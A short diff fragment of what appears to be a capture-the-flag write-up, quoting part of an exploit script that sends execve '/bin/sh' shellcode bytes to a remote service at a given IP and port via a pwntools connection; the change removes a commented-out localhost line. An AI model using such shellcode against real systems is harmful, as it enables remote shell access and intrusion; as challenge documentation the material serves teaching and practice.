@@ -119,7 +119,6 @@ The following dirty [little exploit](solution/ebp_sploit.py) will do the trick:
 >buf += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 >
 >host = '52.6.64.173'
->#host = '127.0.0.1'
 >port = 4545
 >
 >h = remote(host, port, timeout = None)
